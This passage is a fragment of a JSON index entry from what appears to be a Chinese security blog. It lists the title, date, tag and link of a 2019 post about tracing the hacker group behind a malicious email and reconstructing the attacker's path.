复盘整个溯源过程，还原攻击者攻击路径。\n","date":"2019-11-02","permalink":"https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/","tags":["红队"],"title":"如何通过一封恶意邮件追踪幕后黑客组织"}]